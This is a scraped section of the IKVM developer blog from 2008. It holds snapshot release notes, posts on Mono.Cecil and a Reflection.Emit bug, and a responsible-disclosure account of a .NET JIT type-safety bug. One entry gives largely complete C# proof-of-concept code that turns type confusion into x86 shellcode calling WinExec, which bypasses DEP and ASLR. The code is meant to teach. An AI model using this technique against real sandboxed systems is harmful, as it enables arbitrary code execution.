	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>This is the final development snapshot before the first 0.38 release candidate.</P>
<P>Changes since previous development snapshot:</P>
<UL>
<LI>Updated to OpenJDK 6 b12.</LI>
<LI>Updated IKVM.OpenJDK.ClassLibrary.dll copyright notices.</LI>
<LI>Removed hardcoded PublicKey from build process.</LI>
<LI>Fixed ikvmc regression that caused using .NET generic types not to work.</LI>
<LI>Added support to ikvmc for recognizing "access" bridge methods, so that they aren't hidden from other .NET code.</LI>
<LI>Removed warnings from IKVM.OpenJDK.ClassLibrary ikvmc build step.</LI></UL>
<P><B>WARNING: THIS IS A DEVELOPMENT SNAPSHOT, NOT AN OFFICIAL RELEASE.</B></P>
<P>Development snapshots are intended for evaluating and keeping track of where the project is going, not for production usage. The binaries have not been extensively tested and are not strong named.</P>
<P>This version supports .NET 2.0 SP1 and later. The binaries will run on Mono 2.0, but building on Mono 2.0&nbsp;is not supported due an <A href="https://bugzilla.novell.com/show_bug.cgi?id=424663">open bug</A>.</P>
<P>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.37.3187.zip">ikvmbin-0.37.3187.zip</A></P>
<P>The OpenJDK 6 b12 (re)source file needed to build from source are available here: <A href="http://www.frijters.net/openjdk6-b12-stripped.zip">openjdk6-b12-stripped.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		09/22/2008 06:51:27 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=fd1b08db-6211-4f5c-b9e8-2b66c604277a"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=fd1b08db-6211-4f5c-b9e8-2b66c604277a">Comments [3]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Saturday, 13 September 2008</h2></div>
<div class="newsItems"><a name="a3cc8beef-3424-488d-8429-50e244f15ccc"></a><div class="entry">
	<h3 class="entryTitle">Writing a .NET Security Exploit PoC</h3>
	<div class="entryBody">
		<P>Let's start out with some convenient types that allow bit twiddeling once we've subverted the type system:</P>
<P><CODE><FONT color=#0000ff>class</FONT> <FONT color=#2b91af>Union1</FONT><BR>{<BR>&nbsp; <FONT color=#0000ff>internal</FONT> <FONT color=#0000ff>volatile</FONT> <FONT color=#0000ff>int</FONT> i;<BR>&nbsp; <FONT color=#0000ff>internal</FONT> <FONT color=#0000ff>volatile</FONT> <FONT color=#0000ff>int</FONT> j;<BR>}<BR><BR><FONT color=#0000ff>class</FONT> <FONT color=#2b91af>Union2</FONT><BR>{<BR>&nbsp; <FONT color=#0000ff>internal volatile object</FONT> o;<BR>&nbsp; <FONT color=#0000ff>internal volatile int</FONT>[] arr;<BR>}</CODE></P>
<P>Now we need a way to get two different references to the same object. This is where the exploit comes in, but since I'm not going to publish an exploit for an unpatched bug, we'll make do with something that works but requires full trust:</P>
<P><CODE>[<FONT color=#2b91af>StructLayout</FONT>(<FONT color=#2b91af>LayoutKind</FONT>.Explicit)]<BR><FONT color=#0000ff>struct</FONT> <FONT color=#2b91af>UnsafeUnion</FONT><BR>{<BR>&nbsp; [<FONT color=#2b91af>FieldOffset</FONT>(0)]<BR>&nbsp; <FONT color=#0000ff>internal</FONT> <FONT color=#2b91af>Union1</FONT> u1;<BR>&nbsp; [<FONT color=#2b91af>FieldOffset</FONT>(0)]<BR>&nbsp; <FONT color=#0000ff>internal</FONT> <FONT color=#2b91af>Union2</FONT> u2;<BR>}<BR><BR><FONT color=#0000ff>static</FONT> <FONT color=#2b91af>Union1</FONT> TypeSystemHole(<FONT color=#2b91af>Union2</FONT> u2)<BR>{<BR>&nbsp; <FONT color=#008000>// NOT ACTUALLY A SECURITY HOLE!</FONT><BR>&nbsp; <FONT color=#008000>// You need full trust to execute this code.</FONT><BR>&nbsp; <FONT color=#2b91af>UnsafeUnion</FONT> uu = <FONT color=#0000ff>new</FONT> <FONT color=#2b91af>UnsafeUnion</FONT>();<BR>&nbsp; uu.u2 = u2;<BR>&nbsp; <FONT color=#0000ff>return</FONT> uu.u1;<BR>}</CODE></P>
<P>Now for the interesting bit, getting some x86 code to execute:</P>
<P><CODE><FONT color=#2b91af>Union1</FONT> u1;<BR><FONT color=#2b91af>Union2</FONT> u2 = <FONT color=#0000ff>new</FONT> <FONT color=#2b91af>Union2</FONT>();<BR>u1 = TypeSystemHole(u2);<BR><BR><FONT color=#008000>// u1 and u2 now reference the same object,<BR>// meaning that we can now convert arbitrary integer<BR>// into objects or arrays (and v.v.)<BR></FONT><BR><FONT color=#2b91af>ThreadStart</FONT> del = <FONT color=#0000ff>new </FONT><FONT color=#2b91af>ThreadStart</FONT>(DummyMethod);<BR><BR><FONT color=#008000>// A delegate provides an easy way to call the code we're<BR>// generating. As it turns out, it is also a good way<BR>// to bypass DEP, because the delegate stub is in writable<BR>// executable memory.</FONT><BR><BR>u2.o = del;<BR>u1.j = u1.i;<BR>u1.j = u2.arr[2] - 12;<BR><BR><FONT color=#008000>// Make the delegate object accessible via the object[],<BR>// then get the address the delegate points to and make<BR>// it accessible via the object[] reference.<BR></FONT><BR><FONT color=#008000>// The x86 code we're creating is:<BR>//<BR>// 6A 05&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push 5 <BR>// 68 xx xx xx xx&nbsp;&nbsp; push offset string "calc.exe"<BR>// B8 xx xx xx xx&nbsp;&nbsp; mov eax,&lt;address of kernel32!WinExec&gt;<BR>// FF D0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; call eax<BR>// C3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ret<BR>// <BR></FONT><BR><FONT color=#2b91af>MemoryStream</FONT> mem = <FONT color=#0000ff>new </FONT><FONT color=#2b91af>MemoryStream</FONT>();<BR><FONT color=#2b91af>BinaryWriter</FONT> bw = <FONT color=#0000ff>new </FONT><FONT color=#2b91af>BinaryWriter</FONT>(mem);<BR>bw.Write((<FONT color=#0000ff>byte</FONT>)0x6A);<BR>bw.Write((<FONT color=#0000ff>byte</FONT>)0x05);<BR>bw.Write((<FONT color=#0000ff>byte</FONT>)0x68);<BR>u2.o = <FONT color=#2b91af>Encoding</FONT>.ASCII.GetBytes(<FONT color=#a31515>"calc.exe\0"</FONT>);<BR>bw.Write(u1.i + 8);<BR>bw.Write((<FONT color=#0000ff>byte</FONT>)0xB8);<BR>bw.Write(GetProcAddressAny(<FONT color=#a31515>"WinExec"</FONT>));<BR>bw.Write((<FONT color=#0000ff>byte</FONT>)0xFF);<BR>bw.Write((<FONT color=#0000ff>byte</FONT>)0xD0);<BR>bw.Write((<FONT color=#0000ff>byte</FONT>)0xC3);<BR>bw.Write(0);<BR><BR><FONT color=#008000>// Now that we've created the code, copy it into the delegate<BR>// stub memory area.</FONT><BR><BR><FONT color=#0000ff>byte</FONT>[] tmp = mem.ToArray();<BR><FONT color=#0000ff>for</FONT> (<FONT color=#0000ff>int</FONT> i = 0; i &lt; tmp.Length / 4; i++)<BR>{<BR>&nbsp;&nbsp;u2.arr[1 + i] = <FONT color=#2b91af>BitConverter</FONT>.ToInt32(tmp, i * 4);<BR>}<BR><BR><FONT color=#008000>// Invoke the delegate, which will result in running our<BR>// code, instead of the delegate stub.<BR></FONT><BR>del();</CODE></P>
<P>The missing piece is GetProcAddressAny. It basically searches memory for kernel32 and looks up the address of the WinExec function.</P>
<P>The full source is available here: <A href="http://www.frijters.net/TypeSafetyExploitPoC.cs.txt">TypeSafetyExploitPoC.cs</A></P>
<P>Note that this PoC requires full trust and obviously only works on x86, but all the ideas are applicable to x64 as well.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		09/13/2008 09:03:01 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=3cc8beef-3424-488d-8429-50e244f15ccc"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=3cc8beef-3424-488d-8429-50e244f15ccc">Comments [3]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 12 September 2008</h2></div>
<div class="newsItems"><a name="ae548c92d-42f7-4691-8b76-83adc59001f8"></a><div class="entry">
	<h3 class="entryTitle">Critical .NET Security Vulnerability</h3>
	<div class="entryBody">
		<P>While browsing the <A href="http://www.microsoft.com/downloads/details.aspx?FamilyID=8c09fd61-3f26-4555-ae17-3121b4f51d4d&amp;displaylang=en">Rotor</A> sources yesterday, I noticed something that looked like a potential security issue. After writing some test code I confirmed that it was indeed a problem. Like <A HREF="/PermaLink.aspx?guid=3b9e044f-673d-462b-a16e-222a862f1df3">last time</A>, it's a bug that allows you to&nbsp;compromise type safety.</P>
<P>Previously I promised to write more about the issue after the <A href="http://www.microsoft.com/technet/security/bulletin/ms07-040.mspx">fix was released</A>, but I never got around to it, partly because security issues aren't very exciting anymore after they've been fixed.</P>
<P>BTW, my "<A HREF="/PermaLink.aspx?guid=fc89b4f3-1208-44c2-ad52-9aedec7fac9b">no Microsoft bug filing policy</A>" doesn't apply to security issues, so I've notified the Microsoft Security Response Center of the issue.</P>
<P>Anyway, I thought this would be a good opportunity to look at the previously fixed issue and demonstrate how a type safety hole leads to arbitrary code execution and makes it trivial to bypass both <A href="http://en.wikipedia.org/wiki/Data_Execution_Prevention">DEP</A> and <A href="http://en.wikipedia.org/wiki/Address_space_layout_randomization">ASLR</A>.</P>
<P><B>Discovering the Bug</B></P>
<P>This is the hard part. Contrary to popular belief, Microsoft writes pretty secure code nowadays. I found the issue because an IKVM user reported a problem with some code that worked with JIT optimizations disabled, but mysteriously failed when JIT optimizations were on. Debugging this issue led to misbehaving code similar to this:</P>
<P><CODE>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>if </FONT>(arr1[index * 3 + 5] != <FONT color=#0000ff>null</FONT>)<BR>&nbsp;&nbsp;&nbsp; {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <FONT color=#2b91af>Union1</FONT> u1 = arr1[index * 3 + 5];</CODE> </P>
<P>Due to a JIT bug the second array indexing expression was incorrectly applied, resulting in the ability to read a value outside of the array bounds.</P>
<P><B>Type Safety</B></P>
<P>Due to the predictability of memory allocation in managed code, it is easy to allocate two arrays of different types and then use the above bug to access an element from one array through a reference to the other array. This gives you the ability to perform a cast that otherwise wouldn't be allowed.</P>
<P>Once you have this ability, it can be easily abused. For example, you could create a class like this:</P>
<P><CODE><FONT color=#0000ff>class</FONT> <FONT color=#2b91af>StringHack</FONT><BR>{<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>public int</FONT> arrayLength;<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>public int</FONT> stringLength;<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>public char</FONT> ch1;<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>public char</FONT> ch2;<BR>}</CODE></P>
<P>If you now obtain a reference typed as <CODE>StringHack</CODE> to a real string object, you have the ability to alter the contents of the string (well, the first two characters in this example).</P>
<P>However, it's not just the .NET access restrictions that can be bypassed, you can also use this trick to execute arbitrary machine code.</P>
<P>Next time we'll look at a PoC that, given a type safety hole, will allow you to call WinExec to start any application from partially trusted .NET code.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		09/12/2008 09:41:53 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=e548c92d-42f7-4691-8b76-83adc59001f8"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=e548c92d-42f7-4691-8b76-83adc59001f8">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 01 September 2008</h2></div>
<div class="newsItems"><a name="a7e91b51d-6f84-4485-b61f-ea9e068a5fcf"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>Lots of cleanup and restructuring. Removed most .NET reflection (almost everything is now based on DynamicMethod) and improved support for running in partial trust.</P>
<P>Changes since previous development snapshot:</P>
<UL>
<LI>Switched almost all code to using generic collections.</LI>
<LI>Removed our own tracking of LocalBuilders, because on .NET 2.0 LocalBuilder has a LocalIndex property.</LI>
<LI>Added multi target support to ikvmc (although it is currently disabled, because of a <A HREF="/PermaLink.aspx?guid=afe525f9-1715-4db2-9d71-34892292cb87">showstopper .NET Ref.Emit bug</A>).</LI>
<LI>Replaced usage of BootstrapClassLoader with actual class loader in static compiler.</LI>
<LI>Moved generated exception mapping code from ExceptionHelper to Throwable and made it slightly less hacky.</LI>
<LI>Replaced mapxml Hashtable with three statically typed Dictionaries.</LI>
<LI>Eleminated some (CompilerClassLoader) downcasts by making the type of the DynamicTypeWrapper.classLoader field depend on whether we're compiling the runtime or ikvmc.</LI>
<LI>Removed unused per-type class caching.</LI>
<LI>Added helper methods to no longer require reflection to instantiate DirectByteBuffer from JNI.</LI>
<LI>Bug fix: dynamic (for unloadable classes) getfield/getstatic/invoke* bytecode compilation couldn't handle ghost types.</LI>
<LI>Changed dynamic (for unloadable classes) bytecode handling to use Java reflection.</LI>
<LI>Changed JNI reflection to be based on Java reflection (where possible).</LI>
<LI>Removed "slow" reflection.</LI>
<LI>Removed MethodWrapper.Invoke().</LI>
<LI>Removed FieldWrapper.GetValue()/SetValue().</LI>
<LI>Added ICustomInvoke for the few MethodWrappers that still require custom reflection invocation.</LI>
<LI>Removed class init workaround that is no longer required since .NET 2.0 SP1.</LI>
<LI>Removed GNU Classpath specific code that I missed.</LI>
<LI>Switched from obsolete ConfigurationSettings.AppSettings to new ConfigurationManager.AppSettings.</LI>
<LI>Fixed VFS root directory entry.</LI>
<LI>Removed no longer needed VM.isBooted() check (VM.isBooted() always returns true now on IKVM).</LI>
<LI>Forked java/nio/Bits.java to remove unsafe code from static initializer.</LI>
<LI>Moved all creations of DynamicMethod to util method that uniformly handles the fallback to the new .NET 2.0 SP1 constructor that support partial trust.</LI></UL>
<P><B>WARNING: THIS IS A DEVELOPMENT SNAPSHOT, NOT AN OFFICIAL RELEASE.</B><BR><BR>Development snapshots are intended for evaluating and keeping track of where the project is going, not for production usage. The binaries have not been extensively tested and are not strong named.<BR><BR>This version supports .NET 2.0 SP1 and Mono 2.0.<BR><BR>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.37.3166.zip">ikvmbin-0.37.3166.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		09/01/2008 09:04:03 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=7e91b51d-6f84-4485-b61f-ea9e068a5fcf"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=7e91b51d-6f84-4485-b61f-ea9e068a5fcf">Comments [4]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 27 August 2008</h2></div>
<div class="newsItems"><a name="aafda88af-e2cf-47d6-917b-5f3134b681c1"></a><div class="entry">
	<h3 class="entryTitle">Cecil Conclusion</h3>
	<div class="entryBody">
		<P>I finished the Cecil.Reflection.Emit prototype of ikvmc. As I, unfortunately, expected the performance isn't acceptable. Compiling tools.jar takes approx. 18 seconds with the Ref.Emit backend, but takes 51 seconds with the Cecil based backend.</P>
<P>Now, I'm not knocking Mono.Cecil because of its performance, because I think the design was based on making it easy to load an assembly, tweak it and write it back out again. For that application the design makes a lot of sense, but it is less efficient for a write only task.</P>
<P>However, I did have to conclude that Mono.Cecil is not mature enough for usage with ikvmc. I had to write my own custom attribute encoder to work around Mono.Cecil's brokenness and I found that it doesn't properly support custom modifiers.</P>
<P><B>What Next</B></P>
<P>Given that neither Ref.Emit nor Cecil look like viable short term strategies for multi target support in ikvmc, I think it makes sense to start working on the 0.38 release now and put off the splitting of IKVM.OpenJDK.ClassLibrary.dll until the next release. I know this will disappoint some people, especially since it grew by about 4.7MB again (mostly due to the inclusion of the charsets.jar character encodings).</P>
<P>I don't have a timetable, but don't expect the release tomorrow. It'll be a while. First OpenJDK6 b12 needs to be released (and integrated) and then a whole lot of testing needs to be done.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		08/27/2008 06:11:46 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=afda88af-e2cf-47d6-917b-5f3134b681c1"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=afda88af-e2cf-47d6-917b-5f3134b681c1">Comments [3]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Tuesday, 12 August 2008</h2></div>
<div class="newsItems"><a name="ac8ee66de-d82a-4383-a285-bef105972b9f"></a><div class="entry">
	<h3 class="entryTitle">Using Mono.Cecil instead of Reflection.Emit in IKVMC</h3>
	<div class="entryBody">
		<P>I prototyped a Reflection.Emit layer for Mono.Cecil and integrated it with ikvmc. Preliminary results:</P>
<UL>
<LI>It looks like it is feasible to replace "using System.Reflection.Emit;" with "using Cecil.Reflection.Emit;" and only require a handful of "#if CECIL"s sprinkled through the code. 
<LI>Mono.Cecil is lacking some functionality required by ikvmc (global methods, multi module assemblies, support for calli signatures [AFAICT], support for byte[] arguments in custom attributes) 
<LI>Given the architecture of Mono.Cecil I'm worried that it will perform worse than Reflection.Emit (which, on .NET, is already pretty slow).</LI></UL>
<P>I'm pretty sure there are more issues waiting to be discovered, but these I found while trying to compile a relatively simple .class file. I got it to generate a verifiable assembly using the following ikvmc command:</P>
<P>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <CODE>ikvmc test.class -target:library -nostacktraceinfo</CODE></P>
<P>If you want to play along, the Cecil.Reflection.Emit layer plus the ikvmc patch (relative to current cvs) can be found <A href="http://www.frijters.net/ikvm-cecil.zip">here</A>.</P>
<P>At this point I'm not sure what's next. I don't feel working on Mono.Cecil is the best use of my time. I may have to put the multi assembly feature of ikvmc on the back burner (which also means no progress in splitting up IKVM.OpenJDK.ClassLibrary.dll).</P>
<P>On a more possitive note, doing this work made me realize that <CODE><A href="http://msdn.microsoft.com/en-us/library/system.reflection.emit.constructorbuilder.aspx">ConstructorBuilder</A></CODE> is a useless annoyance and I can simplify some ikvm code by only using <CODE><A href="http://msdn.microsoft.com/en-us/library/system.reflection.emit.methodbuilder.aspx">MethodBuilder</A></CODE> (it turns out that <CODE><A href="http://msdn.microsoft.com/en-us/library/system.reflection.emit.typebuilder.definemethod.aspx">DefineMethod</A></CODE> can also be used to define a constructor).</P>
<P>Well, I will be able to do this once Mono's <CODE><A href="http://anonsvn.mono-project.com/viewcvs/trunk/mcs/class/corlib/System.Reflection.Emit/TypeBuilder.cs?view=markup">DefineMethod</A></CODE> is <A href="https://bugzilla.novell.com/show_bug.cgi?id=416632">fixed</A> so that it notices that a constructor is created and not insert another default constructor.</P>
<P><STRONG>Update:</STRONG> Zoltan already fixed the Mono bug. Thanks!</P>
<P><STRONG>Update 2:</STRONG> Jb Evain pointed out that global methods are supported (simply add the methods to the &lt;Module&gt; <MODULE>type) and that calli is supported via Mono.Cecil.CallSite.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		08/12/2008 17:39:21 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=c8ee66de-d82a-4383-a285-bef105972b9f"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=c8ee66de-d82a-4383-a285-bef105972b9f">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Sunday, 10 August 2008</h2></div>
<div class="newsItems"><a name="aafe525f9-1715-4db2-9d71-34892292cb87"></a><div class="entry">
	<h3 class="entryTitle">Reflection.Emit Bug</h3>
	<div class="entryBody">
		<P>I started working on support for compiling multiple assemblies at once with ikvmc (to support mutual depedencies) and ran into a rather annoying bug:</P>
<P><CODE><FONT color=#0000ff>using</FONT> System;<BR><FONT color=#0000ff>using</FONT> System.Reflection;<BR><FONT color=#0000ff>using</FONT> System.Reflection.Emit;<BR><BR><FONT color=#0000ff>class</FONT> <FONT color=#2b91af>Program</FONT><BR>{<BR>&nbsp; <FONT color=#0000ff>static void</FONT> Main()<BR>&nbsp; {<BR>&nbsp;&nbsp;&nbsp; <FONT color=#2b91af>AssemblyBuilder</FONT> ab1 = <FONT color=#2b91af>AppDomain</FONT>.CurrentDomain.DefineDynamicAssembly(<FONT color=#0000ff>new</FONT> <FONT color=#2b91af>AssemblyName</FONT>(<FONT color=#a31515>"A1"</FONT>), <FONT color=#2b91af>AssemblyBuilderAccess</FONT>.Save);<BR>&nbsp;&nbsp;&nbsp; <FONT color=#2b91af>AssemblyBuilder</FONT> ab2 = <FONT color=#2b91af>AppDomain</FONT>.CurrentDomain.DefineDynamicAssembly(<FONT color=#0000ff>new</FONT> <FONT color=#2b91af>AssemblyName</FONT>(<FONT color=#a31515>"A2"</FONT>), <FONT color=#2b91af>AssemblyBuilderAccess</FONT>.Save);<BR>&nbsp;&nbsp;&nbsp; <FONT color=#2b91af>ModuleBuilder</FONT> mod1 = ab1.DefineDynamicModule(<FONT color=#a31515>"A1"</FONT>);<BR>&nbsp;&nbsp;&nbsp; <FONT color=#2b91af>ModuleBuilder</FONT> mod2 = ab2.DefineDynamicModule(<FONT color=#a31515>"A2"</FONT>);<BR><BR>&nbsp;&nbsp;&nbsp; <FONT color=#2b91af>TypeBuilder</FONT> tb1 = mod1.DefineType(<FONT color=#a31515>"T1"</FONT>);<BR>&nbsp;&nbsp;&nbsp; <FONT color=#2b91af>TypeBuilder</FONT> tb2 = mod2.DefineType(<FONT color=#a31515>"T2"</FONT>);<BR><BR>&nbsp;&nbsp;&nbsp; <FONT color=#2b91af>ConstructorBuilder</FONT> cb1 = tb1.DefineConstructor(MethodAttributes.Public, <FONT color=#2b91af>CallingConventions</FONT>.Standard, <FONT color=#0000ff>null</FONT>);<BR>&nbsp;&nbsp;&nbsp; <FONT color=#2b91af>ConstructorBuilder</FONT> cb2 = tb2.DefineConstructor(MethodAttributes.Public, <FONT color=#2b91af>CallingConventions</FONT>.Standard, new Type[] { tb1 });<BR><BR>&nbsp;&nbsp;&nbsp; <FONT color=#2b91af>ILGenerator</FONT> ilgen = cb1.GetILGenerator();<BR><BR>&nbsp;&nbsp;&nbsp; ilgen.Emit(<FONT color=#2b91af>OpCodes</FONT>.Ldnull);<BR>&nbsp;&nbsp;&nbsp; ilgen.Emit(<FONT color=#2b91af>OpCodes</FONT>.Newobj, cb2);<BR>&nbsp; }<BR>}</CODE></P>
<P>Running this on&nbsp;.NET 2.0 SP1&nbsp;results in:</P>
<P><CODE>Unhandled Exception: System.Runtime.InteropServices.COMException (0x80131130): Record not found on lookup. (Exception from HRESULT: 0x80131130)<BR>&nbsp;&nbsp; at System.Reflection.Module._InternalGetMemberRef(Module refedModule, Int32 tr, Int32 defToken)<BR>&nbsp;&nbsp; at System.Reflection.Emit.ModuleBuilder.InternalGetConstructorToken(ConstructorInfo con, Boolean usingRef)<BR>&nbsp;&nbsp; at System.Reflection.Emit.ILGenerator.GetMethodToken(MethodBase method, Type[] optionalParameterTypes)<BR>&nbsp;&nbsp; at System.Reflection.Emit.ILGenerator.Emit(OpCode opcode, ConstructorInfo con)<BR>&nbsp;&nbsp; at Program.Main() in c:\vsp\RefEmitBugRepro\Program.cs:line 23</CODE></P>
<P>The "<A HREF="/PermaLink.aspx?guid=fc89b4f3-1208-44c2-ad52-9aedec7fac9b">no Microsoft bug filing</A>" policy is still in effect, so I won't be filing a bug with Microsoft for this.</P>
<P><B>Workaround</B></P>
<P>For the scenario above there is a (painful) workaround. You can create your own ConstructorInfo subclass that represents the constructor you want to call, if you do that ILGenerator.Emit() will end up in a different code path to lookup the token and that code path does work.</P>
<P>I haven't tried it, but I assume this workaround also works for methods and fields.</P>
<P>I think that for ikvmc I won't be using this workaround, but instead I'll treat this as a good reason to finally start looking into using Mono.Cecil instead of Reflection.Emit.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		08/10/2008 10:02:40 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=afe525f9-1715-4db2-9d71-34892292cb87"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=afe525f9-1715-4db2-9d71-34892292cb87">Comments [3]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 07 August 2008</h2></div>
<div class="newsItems"><a name="adb8bfdfa-42da-4f0a-a917-4ff9290ace51"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>Time for another snapshot.</P>
<P>Changes since previous development snapshot:</P>
<UL>
<LI>Removed support for building with GNU Classpath class library.</LI>
<LI>DatagramSocket: Implemented connected datagram sockets using .NET 2.0 API.</LI>
<LI>DatagramSocket: Used .NET 2.0 Socket.IOControl() API to disable WSAECONNRESET errors (when not connected).</LI>
<LI>DatagramSocket: Throw PortUnreachableException from receive() if we receive WSAECONNRESET while connected.</LI>
<LI>Various java.util.zip compatibility and bug fixes.</LI>
<LI>Fixed bytecode compiler not to generate unneeded GC.KeepAlive() in constructor for Exception types that don't have a finalize() method.</LI>
<LI>Fixed <A href="http://sourceforge.net/tracker/index.php?func=detail&amp;aid=2001802&amp;group_id=69637&amp;atid=525264">#2001802</A> contributed by Andy Malakov.</LI>
<LI>Fixed <A href="http://sourceforge.net/tracker/index.php?func=detail&amp;aid=2001799&amp;group_id=69637&amp;atid=525264">#2001799</A>.</LI>
<LI>Fixed <A href="http://sourceforge.net/tracker/index.php?func=detail&amp;aid=2006953&amp;group_id=69637&amp;atid=525264">#2006953</A>.</LI>
<LI>Fixed file I/O error handling incompatibilities.</LI>
<LI>Added ghost array tagging to be able to report the instantiated class (instead of the object[] which is allocated instead).</LI>
<LI>Fixed ldc &lt;class&gt; where &lt;class&gt; is a ghost array.</LI>
<LI>Fixed bug in instanceof &lt;class&gt; where &lt;class&gt; is a Serializable[].</LI>
<LI>Removed Mono workarounds that are no longer needed with Mono 2.0.</LI></UL>
<P><B>WARNING: THIS IS A DEVELOPMENT SNAPSHOT, NOT AN OFFICIAL RELEASE.</B><BR><BR>Development snapshots are intended for evaluating and keeping track of where the project is going, not for production usage. The binaries have not been extensively tested and are not strong named.<BR><BR>This version supports .NET 2.0 SP1 and Mono 2.0.<BR><BR>Binaries available here: <A href="http://www.frijters.net/ikvmbin-0.37.3141.zip">ikvmbin-0.37.3141.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		08/07/2008 08:13:00 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=db8bfdfa-42da-4f0a-a917-4ff9290ace51"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=db8bfdfa-42da-4f0a-a917-4ff9290ace51">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 09 July 2008</h2></div>
<div class="newsItems"><a name="acb24cc03-6a1c-42ce-8762-3ede24ca8640"></a><div class="entry">
	<h3 class="entryTitle">PDC</h3>
	<div class="entryBody">
		<P>I'll be at the <A href="http://www.microsoftpdc.com/">PDC</A> again this year. Drop me a line if you're going and want to meet me there&nbsp;to chat (or to buy me a beer ;-)).</P>
